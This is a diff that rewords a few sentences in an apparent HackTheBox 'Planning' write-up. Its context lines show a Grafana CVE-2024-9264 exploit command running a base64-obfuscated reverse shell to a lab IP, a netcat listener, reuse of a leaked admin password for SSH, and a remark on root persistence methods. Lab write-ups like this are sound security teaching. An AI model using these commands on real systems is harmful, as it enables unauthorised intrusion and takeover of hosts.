@@ -68,7 +68,7 @@ $ python3 CVE-2024-9264.py -u admin -p [REDACTED] \
 [*] Executing command: echo c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44My80NDQ0IDA+JjE= | base64 -d | bash
 :::
 
-Listener catches a shell — and it's root:
+The listener catches a root shell:
 
 ::: terminal title="shell · root@container" lang="bash"
 $ nc -lvnp 4444
@@ -92,7 +92,7 @@ GF_AUTH_AnonymousEnabled=false
 
 ::: img src="../assets/img/writeups/htb-planning/03-env-leak.png" caption="Plaintext GF_SECURITY_ADMIN_PASSWORD sitting in container env"
 
-Grabbing `/etc/passwd` on the host via LFI was unnecessary — `ssh enzo@planning.htb` with the `GF_SECURITY_ADMIN_PASSWORD` just works:
+Grabbing `/etc/passwd` on the host via LFI was unnecessary. `ssh enzo@planning.htb` with the `GF_SECURITY_ADMIN_PASSWORD` just works:
 
 ::: terminal title="shell · enzo@planning" lang="bash"
 enzo@planning:~$ cat user.txt
@@ -137,7 +137,7 @@ $ cat /home/enzo/root.txt
 :::
 
 ::: note title="REPORT NOTE"
-For a real engagement I would have replaced `root`'s password or symlinked `/bin/bash` with the SUID bit — copy-and-chmod'ing a single file is the polite lab version.
+For a real engagement I would have replaced `root`'s password or symlinked `/bin/bash` with the SUID bit. Copying and chmodding a single file is the lab version.
 :::
 
 :::
